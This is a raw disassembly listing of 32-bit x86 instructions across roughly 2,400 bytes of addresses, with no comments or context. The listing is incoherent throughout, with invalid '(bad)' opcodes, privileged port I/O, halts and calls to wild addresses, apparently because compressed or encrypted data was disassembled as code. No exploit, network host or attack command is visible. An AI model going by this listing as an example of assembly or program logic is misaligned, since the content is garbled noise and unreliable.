  41c602:	mov    eax,DWORD PTR [eax-0x2b]
  41c605:	mov    esi,0xbcd87403
  41c60a:	mul    edi
  41c60c:	ret    0x3f1e
  41c60f:	std    
  41c610:	rcl    BYTE PTR ss:[ecx+0x1a],0xe8
  41c615:	test   DWORD PTR [ebx-0x5307329d],0x4f7ecaf
  41c61f:	mov    esp,DWORD PTR [eax+eax*2+0x3c]
  41c623:	std    
  41c624:	mov    dh,0x1e
  41c626:	ds dec ebp
  41c628:	scas   al,BYTE PTR es:[edi]
  41c629:	in     eax,0xcd
  41c62b:	adc    eax,0x438bf029
  41c630:	in     eax,dx
  41c631:	jbe    0x41c67b
  41c633:	or     al,0x39
  41c635:	mov    ch,BYTE PTR [ebx+0x5b76001]
  41c63b:	mov    eax,DWORD PTR [edx]
  41c63d:	hlt    
  41c63e:	fadd   QWORD PTR [esi-0x24da3406]
  41c644:	cs icebp 
  41c646:	add    al,0x89
  41c648:	and    al,0x3c
  41c64a:	loopne 0x41c6a9
  41c64c:	xor    BYTE PTR [esi],dh
  41c64e:	or     eax,0x9b25e00
  41c653:	call   0xfd8054d2
  41c658:	ret    
  41c659:	xchg   DWORD PTR [ebx-0x39940001],ebp
  41c65f:	adc    BYTE PTR [eax-0x55],dl
  41c662:	inc    ecx
  41c663:	std    
  41c664:	add    BYTE PTR [eax],0x0
	...
  41c67b:	add    BYTE PTR [eax],al
  41c67d:	add    cl,cl
  41c67f:	cmp    al,0xc0
  41c681:	push   esi
  41c682:	(bad)  
  41c683:	push   esp
  41c684:	and    DWORD PTR [eax],ecx
  41c686:	out    0x76,al
  41c688:	cmp    DWORD PTR [ebp-0x75b2be65],ecx
  41c68e:	mov    ecx,DWORD PTR [ecx]
  41c690:	push   esi
  41c691:	call   0x41c815
  41c696:	imul   ebx,ecx,0x64
  41c699:	sbb    cl,BYTE PTR [ecx+eax*1+0x2f]
  41c69d:	shl    BYTE PTR [ebx-0x3d],0x3
  41c6a1:	add    BYTE PTR [eax-0x13ae1446],cl
  41c6a7:	mov    ecx,0x818d8b05
  41c6ac:	std    
  41c6ad:	dec    DWORD PTR ds:0xa8ff5472
  41c6b3:	inc    eax
  41c6b4:	mov    bl,BYTE PTR [ebp+0x35]
  41c6b7:	fstp   DWORD PTR [edx+0x33]
  41c6ba:	inc    edx
  41c6bb:	mov    BYTE PTR [ebx-0x4ed4640],0x75
  41c6c2:	mov    eax,ds:0x8ffc5bf
  41c6c7:	leave  
  41c6c8:	cli    
  41c6c9:	jne    0x41c69c
  41c6cb:	loopne 0x41c69a
  41c6cd:	add    ch,cl
  41c6cf:	or     bl,bh
  41c6d1:	jne    0x41c738
  41c6d3:	mov    edi,0x2ea6e8f7
  41c6d8:	(bad)  
  41c6d9:	inc    DWORD PTR [esi+0x3a]
  41c6dc:	mov    BYTE PTR [ebp-0x2b],cl
  41c6df:	mov    edi,0x807f
	...
  41c6f8:	add    BYTE PTR [eax],al
  41c6fa:	add    BYTE PTR [eax+ecx*1-0x51baa900],bl
  41c701:	inc    DWORD PTR cs:[edx+0x17]
  41c705:	rol    BYTE PTR [ebp-0x630a2d0c],0xb4
  41c70c:	imul   ebp,DWORD PTR [edx+0x136b6c6],0x53
  41c713:	outs   dx,DWORD PTR ds:[esi]
  41c714:	retf   0xec81
  41c717:	les    ebx,FWORD PTR [esi-0x4bfc2786]
  41c71d:	inc    ecx
  41c71e:	dec    eax
  41c71f:	ret    0x7a7a
  41c722:	out    dx,eax
  41c723:	call   0xeeb4805c
  41c728:	jmp    0x41c6e9
  41c72a:	sti    
  41c72b:	fiadd  WORD PTR [esi]
  41c72d:	std    
  41c72e:	lds    esi,FWORD PTR [ecx-0xb9626ff]
  41c734:	cmp    cl,ch
  41c736:	sti    
  41c737:	imul   ebp,DWORD PTR [ecx+0x31],0x2e05f46a
  41c73e:	and    ch,dh
  41c740:	sub    eax,0xae6f0678
  41c745:	cmp    edi,0x1b
  41c748:	cs jbe 0x41c796
  41c74b:	and    al,0xfd
  41c74d:	inc    edx
  41c74e:	jae    0x41c748
  41c750:	inc    edx
  41c751:	int    0x7
  41c753:	or     al,0x3c
  41c755:	paddw  mm7,mm3
  41c758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c759:	dec    ebx
  41c75a:	xor    ebx,0xfffffff1
  41c75d:	in     al,dx
  41c75e:	push   eax
	...
  41c777:	add    BYTE PTR [ebx-0x6a],al
  41c77a:	stos   DWORD PTR es:[edi],eax
  41c77b:	cld    
  41c77c:	jecxz  0x41c718
  41c77e:	jp     0x41c758
  41c780:	outs   dx,DWORD PTR ds:[esi]
  41c781:	sub    dl,bh
  41c783:	(bad)  
  41c784:	jle    0x41c720
  41c786:	inc    ebx
  41c787:	adc    BYTE PTR [esi+0x6e],bh
  41c78a:	push   edi
  41c78b:	outs   dx,DWORD PTR ds:[esi]
  41c78d:	and    edi,DWORD PTR [eax-0x80]
  41c790:	je     0x41c7be
  41c792:	add    DWORD PTR [eax],eax
  41c794:	sbb    DWORD PTR [eax],0x4794ef8
  41c79a:	mov    ah,0xfb
  41c79c:	xor    bh,BYTE PTR [esp+edx*8]
  41c79f:	sti    
  41c7a0:	sub    ecx,DWORD PTR [edi-0xb8ba3d6]
  41c7a6:	dec    ebp
  41c7a7:	inc    ebp
  41c7a8:	jo     0x41c7ee
  41c7aa:	mov    ebx,0xeab180e6
  41c7af:	js     0x41c763
  41c7b1:	cmp    edi,DWORD PTR [ebx+edi*8+0x3cf2cc4]
  41c7b8:	hlt    
  41c7b9:	add    al,0x26
  41c7bb:	iret   
  41c7bc:	sti    
  41c7bd:	and    DWORD PTR [edi],0xff4778f5
  41c7c3:	shr    edx,1
  41c7c5:	add    eax,0xf63458e7
  41c7ca:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41c7cc:	mov    eax,ds:0xec422fdf
  41c7d1:	add    al,0x9c
  41c7d3:	js     0x41c7f5
  41c7d5:	xchg   DWORD PTR [ebx],eax
  41c7d7:	dec    esp
  41c7d8:	jne    0x41c802
  41c7da:	add    esi,DWORD PTR [ecx+0x0]
	...
  41c7f4:	add    cl,cl
  41c7f6:	rcr    ebp,cl
  41c7f8:	into   
  41c7f9:	out    dx,eax
  41c7fa:	(bad)  
  41c7fb:	xlat   BYTE PTR ds:[ebx]
  41c7fc:	js     0x41c7b5
  41c7fe:	adc    al,0x41
  41c800:	add    al,0x7f
  41c802:	fmul   DWORD PTR [edx]
  41c804:	and    al,0xc
  41c806:	popf   
  41c807:	mov    esp,0x2b8cf944
  41c80c:	and    BYTE PTR [eax],al
  41c80e:	and    BYTE PTR [edi-0x507a0c32],0x44
  41c815:	fistp  DWORD PTR [esi-0x19]
  41c818:	add    esi,esp
  41c81a:	xchg   DWORD PTR ds:0x365e051c,edx
  41c820:	jl     0x41c84a
  41c822:	loope  0x41c7fe
  41c824:	inc    esp
  41c825:	out    0x1c,eax
  41c827:	fld    st(3)
  41c829:	mov    ebx,0x723f000b
  41c82e:	add    cl,BYTE PTR [eax-0xb]
  41c831:	add    cl,ch
  41c833:	jb     0x41c80b
  41c835:	je     0x41c87a
  41c837:	sbb    BYTE PTR [edx-0x67],dh
  41c83a:	std    
  41c83b:	inc    ebx
  41c83c:	or     eax,0x4e63b5a0
  41c841:	mov    edx,0x87ac890e
  41c846:	mov    ds:0x4f7e9c6,al
  41c84b:	call   0xfd7b767a
  41c850:	gs mov bh,0xb0
  41c853:	dec    edi
  41c854:	loopne 0x41c8af
  41c856:	or     DWORD PTR [ebx+0x29],edx
	...
  41c870:	add    BYTE PTR [eax],al
  41c872:	ffreep st(0)
  41c874:	and    edi,ecx
  41c876:	lods   al,BYTE PTR ds:[esi]
  41c877:	call   0x8d90effc
  41c87c:	push   es
  41c87d:	ret    0xe683
  41c880:	pop    ss
  41c881:	jp     0x41c870
  41c883:	aaa    
  41c884:	je     0x41c853
  41c886:	sub    esp,DWORD PTR [edx]
  41c888:	dec    esi
  41c889:	pushf  
  41c88a:	mov    al,0x37
  41c88c:	test   BYTE PTR [ecx+0x54fcef5c],ch
  41c892:	add    al,0x8c
  41c894:	inc    ebx
  41c895:	stc    
  41c896:	pop    edi
  41c897:	dec    esp
  41c898:	add    cl,ch
  41c89a:	imul   DWORD PTR [esp+ecx*4]
  41c89d:	xor    BYTE PTR [edi+0x3ca98437],dh
  41c8a3:	adc    ebp,eax
  41c8a5:	add    DWORD PTR [esi],esi
  41c8a7:	cmp    ch,bh
  41c8a9:	inc    ebx
  41c8aa:	add    BYTE PTR [esi-0x2afc32bc],cl
  41c8b0:	push   ebp
  41c8b1:	sahf   
  41c8b2:	std    
  41c8b3:	enter  0x2915,0xf8
  41c8b7:	repz fsubr DWORD PTR [edx+0x3c]
  41c8bb:	or     DWORD PTR [ecx+0x0],eax
  41c8be:	loop   0x41c885
  41c8c0:	adc    BYTE PTR [edi+ebx*4],bl
  41c8c3:	inc    ebp
  41c8c4:	std    
  41c8c5:	imul   ebx,DWORD PTR [ebp+0x1a34dced],0xf1647ec6
  41c8cf:	sbb    al,0x0
  41c8d1:	adc    DWORD PTR [esi],0x0
  41c8d4:	jno    0x41c8eb
	...
  41c8ee:	add    BYTE PTR ds:0xa0020544,bl
  41c8f4:	sbb    eax,0x10f174fb
  41c8f9:	sti    
  41c8fa:	je     0x41c8ed
  41c8fc:	adc    al,ch
  41c8fe:	shl    DWORD PTR ds:0x54ebfac6,1
  41c904:	xchg   esp,eax
  41c905:	je     0x41c92b
  41c907:	cmc    
  41c908:	call   0xc63cc6ea
  41c90d:	xchg   BYTE PTR [ecx+eax*2+0x9],dh
  41c911:	sti    
  41c912:	ss cmc 
  41c914:	jbe    0x41c92b
  41c916:	add    DWORD PTR [ebp+0x5b],ecx
  41c919:	in     eax,0x68
  41c91b:	push   ebp
  41c91c:	add    BYTE PTR [eax],al
  41c91e:	lea    esi,[ecx+0x29e81121]
  41c924:	dec    esi
  41c925:	cld    
  41c926:	jmp    DWORD PTR [esi-0x49a1a53e]
  41c92c:	mov    ecx,esp
  41c92e:	pop    ebp
  41c92f:	pop    edi
  41c930:	or     DWORD PTR [eax],eax
  41c932:	push   esi
  41c933:	ret    0xf889
  41c936:	(bad)  
  41c937:	ret    0xe808
  41c93a:	lods   eax,DWORD PTR ds:[esi]
  41c93b:	cmp    dh,al
  41c93d:	cli    
  41c93e:	lea    esi,[edx]
  41c940:	sbb    eax,ebp
  41c942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c943:	cwde   
  41c944:	ret    
  41c945:	cli    
  41c946:	lea    edx,[edx]
  41c948:	sub    DWORD PTR [ebp-0x1],ecx
  41c94b:	loopne 0x41c95d
  41c94d:	adc    al,BYTE PTR [eax-0xc]
  41c950:	sub    eax,0x7d8e
	...
  41c969:	add    BYTE PTR [eax],al
  41c96b:	add    al,dh
  41c96d:	mov    al,ds:0x16fb7441
  41c972:	inc    ecx
  41c973:	adc    esi,eax
  41c975:	pop    edx
  41c976:	sar    edi,0x52
  41c979:	adc    BYTE PTR [ebp+0xd],al
  41c97c:	bound  esp,QWORD PTR [esi]
  41c97e:	int3   
  41c97f:	jae    0x41c96d
  41c981:	je     0x41c93b
  41c983:	or     ebp,DWORD PTR [ecx+0x74]
  41c986:	sbb    ecx,ebp
  41c988:	mul    DWORD PTR [eax-0x1a8ef836]
  41c98e:	mov    bh,0x3
  41c990:	(bad)  
  41c991:	in     eax,dx
  41c992:	sub    eax,0x59d6f43
  41c997:	push   esi
  41c998:	jg     0x41ca14
  41c99a:	in     eax,0x7
  41c99c:	jge    0x41c9ee
  41c99e:	adc    dh,BYTE PTR [ebp-0x4aedd51c]
  41c9a4:	mov    ah,0x2c
  41c9a6:	mov    cs,WORD PTR [edi+0x0]
  41c9a9:	pop    ds
  41c9aa:	jb     0x41c972
  41c9ac:	jno    0x41c9aa
  41c9ae:	mov    ah,0x20
  41c9b0:	outs   dx,DWORD PTR ds:[esi]
  41c9b1:	jne    0x41c9bc
  41c9b3:	cmp    DWORD PTR ds:0x3c291caf,esi
  41c9b9:	jae    0x41ca0a
  41c9bb:	or     eax,0xd83cb6
  41c9c0:	inc    esp
  41c9c1:	cld    
  41c9c2:	ds je  0x41c995
  41c9c5:	xor    DWORD PTR [edx-0x32c6eccb],ecx
  41c9cb:	adc    eax,0xc4842db4
	...
  41c9e8:	add    al,dh
  41c9ea:	push   edx
  41c9eb:	add    eax,DWORD PTR [ecx-0x8ed22d]
  41c9f1:	push   ecx
  41c9f2:	ins    BYTE PTR es:[edi],dx
  41c9f3:	or     al,0x0
  41c9f5:	inc    ecx
  41c9f6:	mov    ds:0x5454f2f,eax
  41c9fb:	idiv   BYTE PTR [ecx+0x33]
  41c9fe:	add    al,0x6a
  41ca00:	sub    ebx,DWORD PTR [edi+ecx*8+0x1a]
  41ca04:	adc    al,0x33
  41ca06:	into   
  41ca07:	adc    cl,BYTE PTR [ecx]
  41ca09:	push   es
  41ca0a:	inc    ebp
  41ca0b:	nop
  41ca0c:	imul   esi,esp,0x248ee704
  41ca12:	sbb    eax,0xb47f0582
  41ca17:	fimul  WORD PTR [esp+ebp*8-0xbc4337d]
  41ca1e:	shl    DWORD PTR [ebp-0x176bb474],cl
  41ca24:	add    esi,esp
  41ca26:	mov    DWORD PTR [edi-0x23c7db15],ebp
  41ca2c:	sbb    esp,esi
  41ca2e:	(bad)  
  41ca2f:	out    0x8c,al
  41ca31:	mov    edx,0xe0446c08
  41ca36:	adc    ch,BYTE PTR [esi]
  41ca38:	mov    edx,0x2c0ed4fb
  41ca3d:	add    DWORD PTR [esi],eax
  41ca3f:	out    0x8a,eax
  41ca41:	mov    bh,0x3c
  41ca43:	(bad)  
  41ca44:	retf   0x8df3
  41ca47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca48:	aas    
  41ca49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca4a:	aaa    
  41ca4b:	fcomp  QWORD PTR [edi]
	...
  41ca65:	add    dh,ah
  41ca67:	(bad)  
  41ca68:	out    0x84,al
  41ca6a:	scas   eax,DWORD PTR es:[edi]
  41ca6b:	cmp    al,0xe7
  41ca6d:	mov    WORD PTR [edi-0x387169f4],?
  41ca73:	cmp    BYTE PTR [edi+edx*1+0x75],bl
  41ca77:	mov    eax,ds:0xf49c03da
  41ca7c:	pop    ebx
  41ca7d:	add    al,0xf4
  41ca7f:	stos   BYTE PTR es:[edi],al
  41ca80:	loop   0x41ca5d
  41ca82:	sbb    edi,DWORD PTR [esi]
  41ca84:	stos   DWORD PTR es:[edi],eax
  41ca85:	add    esi,esp
  41ca87:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca89:	sub    al,0x35
  41ca8b:	ja     0x41ca8d
  41ca8d:	stc    
  41ca8e:	mov    ds:0x9217fd36,al
  41ca93:	add    bl,BYTE PTR [eax-0x25]
  41ca96:	cmp    BYTE PTR ds:0x4f7a5b2,ch
  41ca9c:	test   BYTE PTR [ecx+0x2488e383],ch
  41caa2:	xor    al,0x8c
  41caa4:	push   ebx
  41caa5:	sub    DWORD PTR [eax-0x36],0x1ece1607
  41caac:	sahf   
  41caad:	lods   eax,DWORD PTR ds:[esi]
  41caae:	test   DWORD PTR [esp+eax*4],0x89076ba9
  41cab5:	mov    ah,0xef
  41cab7:	iret   
  41cab8:	imul   esp,ebp,0xe1538baf
  41cabe:	fistp  QWORD PTR [ebx-0x3f]
  41cac1:	jmp    0x471a55bd
  41cac6:	inc    edx
  41cac7:	cs call 0x41cbb3
	...
  41cae1:	add    BYTE PTR [eax],al
  41cae3:	or     al,0x36
  41cae5:	std    
  41cae6:	arpl   WORD PTR [eax-0x5170a729],si
  41caec:	inc    edx
  41caed:	add    al,0xe9
  41caef:	inc    esi
  41caf0:	(bad)  
  41caf1:	push   edx
  41caf2:	jb     0x41ca97
  41caf4:	loop   0x41cb0d
  41caf6:	mov    edi,0x5cf88d2c
  41cafb:	jl     0x41cadb
  41cafd:	push   ebp
  41cafe:	jo     0x41ca83
  41cb00:	loop   0x41cb11
  41cb02:	dec    BYTE PTR [ecx]
  41cb04:	sbb    eax,0x8bf7a912
  41cb09:	inc    ebx
  41cb0a:	in     eax,0x20
  41cb0c:	rol    DWORD PTR [edi],0x5f
  41cb0f:	push   ds
  41cb10:	inc    eax
  41cb11:	inc    esp
  41cb12:	add    eax,0x5e8c3718
  41cb17:	cld    
  41cb18:	mov    eax,DWORD PTR [esi]
  41cb1a:	cmp    dh,BYTE PTR [ecx-0x4f]
  41cb1d:	and    eax,DWORD PTR [eax]
  41cb1f:	sbb    DWORD PTR [ebp+0x6b2174c0],ecx
  41cb25:	std    
  41cb26:	dec    edi
  41cb27:	mov    ds:0xd131c1b,al
  41cb2c:	add    DWORD PTR [ecx],edi
  41cb2e:	add    cl,ah
  41cb30:	add    DWORD PTR [eax],eax
  41cb32:	jne    0x41cae0
  41cb34:	xor    ebx,eax
  41cb36:	(bad)  
  41cb37:	jmp    0xc940d868
  41cb3c:	adc    eax,0x8bcd4012
  41cb41:	mov    edi,0x5a57125b
  41cb46:	pop    ecx
	...
  41cb5f:	add    BYTE PTR [ebx+eax*8],al
  41cb62:	lldt   WORD PTR [esi]
  41cb65:	dec    esp
  41cb66:	std    
  41cb67:	cmp    cl,BYTE PTR [edx+0x19]
  41cb6a:	jbe    0x41cb73
  41cb6c:	fisttp DWORD PTR [ecx+eiz*1+0x20]
  41cb70:	lahf   
  41cb71:	jmp    0x121c:0x1c3256bb
  41cb78:	dec    ebp
  41cb79:	add    DWORD PTR [edx],esi
  41cb7b:	rol    dh,0xd6
  41cb7e:	cli    
  41cb7f:	and    bl,BYTE PTR ss:[esp+eax*1]
  41cb83:	adc    ecx,DWORD PTR [ebp+0x4d267f01]
  41cb89:	imul   edi,DWORD PTR [ebp-0x17fea300],0x4b54
  41cb93:	mov    ebx,ebp
  41cb95:	mov    esi,esi
  41cb97:	je     0x41cb92
  41cb99:	mov    DWORD PTR [ecx],ebx
  41cb9b:	dec    esp
  41cb9c:	dec    ebx
  41cb9d:	inc    ecx
  41cb9e:	std    
  41cb9f:	imul   esp,DWORD PTR [ebp-0xa],0x4f2d2473
  41cba6:	cld    
  41cba7:	shl    DWORD PTR [edi-0x5acfdec3],cl
  41cbad:	add    BYTE PTR [eax],0x0
  41cbb0:	hlt    
  41cbb1:	sub    ecx,DWORD PTR [esi+edi*2+0x3fbad8c0]
  41cbb8:	mov    gs,WORD PTR [ebx]
  41cbba:	(bad)  
  41cbbb:	xchg   DWORD PTR [edx],edi
  41cbbd:	push   es
  41cbbe:	cmp    eax,0xc1544413
  41cbc3:	inc    DWORD PTR [eax]
	...
  41cbdd:	outs   dx,BYTE PTR ds:[esi]
  41cbde:	adc    ch,al
  41cbe0:	aaa    
  41cbe1:	ja     0x41cc45
  41cbe3:	sbb    DWORD PTR [ebx+0x65d61abd],eax
  41cbe9:	ja     0x41cc04
  41cbeb:	or     al,0x0
  41cbed:	dec    edx
  41cbee:	adc    ecx,DWORD PTR ds:0xa33531b6
  41cbf4:	mov    BYTE PTR [ecx+0x36],cl
  41cbf7:	mov    ds:0xa32696be,eax
  41cbfc:	or     BYTE PTR [esi-0x141789ad],dh
  41cc02:	xchg   edx,eax
  41cc03:	add    al,0xe8
  41cc05:	or     dl,BYTE PTR [ebx+0x627c0001]
  41cc0b:	in     eax,0x23
  41cc0d:	outs   dx,DWORD PTR ds:[esi]
  41cc0e:	(bad)  [eax]
  41cc10:	xchg   edx,eax
  41cc11:	cmp    ebx,DWORD PTR [esi]
  41cc13:	add    DWORD PTR [eax-0x3b],edx
  41cc16:	call   0x23c4:0xb3fbd13e
  41cc1d:	and    al,0x9f
  41cc1f:	inc    esp
  41cc20:	or     al,0xac
  41cc22:	xchg   ecx,eax
  41cc23:	adc    ecx,DWORD PTR [eax-0x38]
  41cc26:	cs test eax,0x11df47f
  41cc2c:	push   0xfffffff4
  41cc2e:	jp     0x41cc6e
  41cc30:	adc    esp,DWORD PTR [ebx+edx*2-0x1589003f]
  41cc37:	or     al,0xe9
  41cc39:	lock or DWORD PTR [esi+ebp*2+0x23bca6b6],0x0
	...
  41cc5a:	int3   
  41cc5b:	add    al,0x72
  41cc5d:	inc    ebp
  41cc5e:	sbb    al,0x2f
  41cc60:	mov    esp,0x3380093d
  41cc65:	call   0xac76a451
  41cc6a:	test   BYTE PTR [edx+0x55c0427],ch
  41cc70:	out    0xb,eax
  41cc72:	hlt    
  41cc73:	sbb    al,0x48
  41cc75:	pop    esi
  41cc76:	loope  0x41ccab
  41cc78:	arpl   WORD PTR [eax+eiz*2+0xc],ax
  41cc7c:	pop    edx
  41cc7d:	add    ebx,ebx
  41cc7f:	add    al,0x9e
  41cc81:	cmp    eax,0x727edac9
  41cc86:	out    0x5,eax
  41cc88:	out    0x80,eax
  41cc8a:	adc    eax,0xb2349005
  41cc8f:	xor    edi,DWORD PTR [esi-0x76]
  41cc92:	cmp    al,0xc6
  41cc94:	cmp    sp,WORD PTR [ebx-0x5c7c2d49]
  41cc9b:	push   es
  41cc9c:	fadd   QWORD PTR [eax*8-0x1753ac3]
  41cca3:	pop    ds
  41cca4:	fild   WORD PTR [ebx+0xd4088b]
  41ccaa:	jne    0x41cc92
  41ccac:	out    0x89,al
  41ccae:	mov    esp,0x2ac470f4
  41ccb3:	out    dx,eax
  41ccb4:	push   ds
  41ccb5:	mov    cl,0xf5
  41ccb7:	jle    0x41cce1
  41ccb9:	or     eax,0x3cb744a2
	...
  41ccd6:	add    al,cl
  41ccd8:	call   0x74959ecb
  41ccdd:	cld    
  41ccde:	add    dh,ah
  41cce0:	inc    esi
  41cce1:	jecxz  0x41cce6
  41cce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cce4:	jg     0x41ccf9
  41cce6:	rol    edx,cl
  41cce8:	add    esi,DWORD PTR [esi]
  41ccea:	(bad)
  41cced:	jmp    DWORD PTR [edx+0x41]
  41ccf0:	jecxz  0x41cd47
  41ccf2:	fisub  WORD PTR [eax-0x7709f049]
  41ccf8:	dec    ebx
  41ccf9:	mov    edx,DWORD PTR [ebp-0x6]
  41ccfc:	xor    DWORD PTR ds:0xad01af86,ecx
  41cd02:	fld1   
  41cd04:	jns    0x41ccd8
  41cd06:	jno    0x41ccda
  41cd08:	xor    DWORD PTR ds:0x6631b277,ecx
  41cd0e:	out    0x50,al
  41cd10:	(bad)  
  41cd11:	or     ebx,esi
  41cd13:	popa   
  41cd14:	dec    esp
  41cd15:	add    DWORD PTR [ebx+0x4e0d3ef4],ebx
  41cd1b:	add    al,0x0
  41cd1d:	lods   eax,DWORD PTR ds:[esi]
  41cd1e:	mov    ds:0xdef7be6e,al
  41cd23:	inc    eax
  41cd24:	inc    ebp
  41cd25:	cmp    DWORD PTR [edi-0x16677800],esi
  41cd2b:	test   DWORD PTR [ecx*1+0x438a373e],0x13d06cd9
  41cd36:	push   0x5a
  41cd38:	(bad)  
  41cd39:	(bad)  
  41cd3a:	jmp    0x41cd3f
	...
  41cd53:	add    BYTE PTR [esi],ch
  41cd55:	test   BYTE PTR [ebx-0x7],bh
  41cd58:	idiv   DWORD PTR [edx-0x14d9ddb]
  41cd5e:	mov    BYTE PTR [edi+edi*8+0x7c99c103],bl
  41cd65:	dec    eax
  41cd66:	call   0xfd71edfb
  41cd6b:	fsubrp st(1),st
  41cd6d:	(bad)  
  41cd6e:	ds call 0x574ed7ae
  41cd74:	xor    dl,ah
  41cd76:	(bad)  
  41cd77:	stos   DWORD PTR es:[edi],eax
  41cd78:	repz jnp 0x41cdbe
  41cd7b:	fnstsw WORD PTR [edi+eax*8]
  41cd7e:	verw   WORD PTR [edi+0x154f86cb]
  41cd85:	jl     0x41cdca
  41cd87:	inc    ecx
  41cd88:	push   cs
  41cd89:	inc    ebx
  41cd8a:	cmc    
  41cd8b:	cmp    al,0xc
  41cd8d:	jnp    0x41cd9f
  41cd8f:	mov    esp,eax
  41cd91:	sbb    bh,bh
  41cd93:	ret    0x726
  41cd96:	mov    dl,BYTE PTR [ebx]
  41cd98:	xchg   ebp,eax
  41cd99:	pop    ss
  41cd9a:	cmp    eax,0x71d0e643
  41cd9f:	test   dh,0x1c
  41cda2:	cmp    DWORD PTR [edx],eax
  41cda4:	and    BYTE PTR [edx],bl
  41cda6:	xchg   DWORD PTR [ebp-0x43],eax
  41cda9:	or     bh,BYTE PTR [edi+0xf7fd3eb]
  41cdaf:	mov    ah,cl
  41cdb1:	dec    eax
  41cdb2:	inc    eax
  41cdb3:	cmp    esi,DWORD PTR [ebp+0xebf37a]
	...
  41cdd1:	sar    BYTE PTR [ecx],0x1
  41cdd4:	jne    0x41cd92
  41cdd6:	add    BYTE PTR [ecx+0x10],0x9e
  41cdda:	retf   0x6e6
  41cddd:	daa    
  41cdde:	sbb    cl,BYTE PTR [eax+0x3849cc11]
  41cde4:	fcomp  DWORD PTR [edi+0x154d86f3]
  41cdea:	or     cl,BYTE PTR [ebx+0xc]
  41cded:	add    al,0x3c
  41cdef:	cmc    
  41cdf0:	cmp    ebx,ebx
  41cdf2:	std    
  41cdf3:	test   DWORD PTR [esi+0x2a],ebp
  41cdf6:	out    dx,al
  41cdf7:	cli    
  41cdf8:	pop    esi
  41cdf9:	xchg   esi,eax
  41cdfa:	rol    cl,0xc
  41cdfd:	pop    ebp
  41cdfe:	push   esp
  41cdff:	mov    ah,ch
  41ce01:	into   
  41ce02:	fsubr  QWORD PTR [edi]
  41ce04:	push   ebx
  41ce05:	adc    DWORD PTR [esi+0x30],0xffffffd2
  41ce09:	cs out dx,al
  41ce0b:	inc    edx
  41ce0c:	xor    ebx,DWORD PTR ds:0xf4e85180
  41ce12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce13:	into   
  41ce14:	out    dx,eax
  41ce15:	ins    DWORD PTR es:[edi],dx
  41ce16:	js     0x41ce71
  41ce18:	xchg   DWORD PTR [ecx+0x52faff],esi
  41ce1e:	and    eax,DWORD PTR [edi+0x11bf589]
  41ce24:	mov    DWORD PTR [ecx+0x30538c23],ebp
  41ce2a:	mov    ah,0xc7
  41ce2c:	jmp    0x41cead
  41ce2e:	loopne 0x41ce43
  41ce30:	xchg   DWORD PTR [ecx+0xc9fe53],ebp
	...
  41ce4e:	jmp    0x41ce21
  41ce50:	pushf  
  41ce51:	(bad)  
  41ce52:	repz push ds
  41ce54:	mov    cs,WORD PTR [ebx-0x28]
  41ce57:	mov    bl,0xcf
  41ce59:	imul   DWORD PTR [esi+0x2a]
  41ce5c:	adc    al,0x88
  41ce5e:	sub    DWORD PTR [edi-0x5],ebx
  41ce61:	dec    edx
  41ce62:	in     al,dx
  41ce63:	ss jge 0x41cea4
  41ce66:	cmc    
  41ce67:	sbb    eax,0x97248b01
  41ce6c:	inc    edx
  41ce6d:	inc    ebx
  41ce6e:	aam    0x1d
  41ce70:	add    DWORD PTR [eax],eax
  41ce72:	hlt    
  41ce73:	mov    dl,0x30
  41ce75:	cmp    DWORD PTR [ecx],esi
  41ce77:	pop    edx
  41ce78:	mov    eax,0x25396f59
  41ce7d:	xchg   DWORD PTR [ecx],ebx
  41ce7f:	mov    edx,0xb3885b8d
  41ce84:	mov    bh,0xf7
  41ce86:	int3   
  41ce87:	and    esi,edi
  41ce89:	jb     0x41cec5
  41ce8b:	mov    ds:0x2e193959,eax
  41ce90:	mov    eax,0x2d697f0d
  41ce95:	cmp    al,bh
  41ce97:	add    ch,BYTE PTR [edi-0x47cd44fb]
  41ce9d:	psubusb mm5,mm3
  41cea0:	leave  
  41cea1:	cmp    BYTE PTR [ebp+eax*1-0x64],al
  41cea5:	add    DWORD PTR [ebx-0x4e],esi
  41cea8:	push   cs
  41cea9:	mov    WORD PTR [edi+0x4bb8d234],?
  41ceaf:	mov    dl,0xe9
  41ceb1:	mov    WORD PTR [eax],es
	...
  41cecb:	scas   eax,DWORD PTR es:[edi]
  41cecc:	xor    al,0x6a
  41cece:	mov    eax,0xb7d054b
  41ced3:	fnsave [ecx-0x3d0b4902]
  41ced9:	add    edi,edi
  41cedb:	je     0x41ce87
  41cedd:	mov    BYTE PTR [edi*2+0x7f02f6b2],0x38
  41cee5:	sub    eax,0x4b1886fd
  41ceea:	imul   edi,DWORD PTR [ebp-0x4f],0x1d3f8dca
  41cef1:	adc    al,bh
  41cef3:	jmp    0x41ced0
  41cef5:	xchg   esi,eax
  41cef6:	ret    
  41cef7:	xor    eax,0x7d20147e
  41cefc:	fst    DWORD PTR [esi+0x722d26ed]
  41cf02:	xlat   BYTE PTR ds:[ebx]
  41cf03:	xlat   BYTE PTR ds:[ebx]
  41cf04:	fist   DWORD PTR [esi+0x294d8909]
  41cf0a:	mov    esp,DWORD PTR [edi]
  41cf0c:	pop    ecx
  41cf0d:	imul   BYTE PTR [eax-0x5a]
  41cf10:	jmp    0x41ceae
  41cf12:	mov    edx,0x20147bfb
  41cf17:	jae    0x41ceda
  41cf19:	xchg   BYTE PTR ds:0x4fc47bfa,ch
  41cf1f:	jae    0x41cefa
  41cf21:	inc    esi
  41cf22:	test   bh,bh
  41cf24:	adc    bh,ah
  41cf26:	xchg   BYTE PTR [ecx],ch
  41cf28:	add    edx,esp
  41cf2a:	add    al,0x7f
  41cf2c:	mov    edi,0x8ce9
	...
  41cf45:	add    BYTE PTR [eax],al
  41cf47:	add    bh,al
  41cf49:	adc    al,0xee
  41cf4b:	push   0xf20018c7
  41cf50:	test   eax,0xf8778d01
  41cf55:	add    al,0x0
  41cf57:	mov    edx,DWORD PTR es:[edi-0x80]
  41cf5b:	pushf  
  41cf5c:	jmp    0x41cf62
  41cf5e:	mov    DWORD PTR [ebx+esi*8+0x3b6304b3],ebx
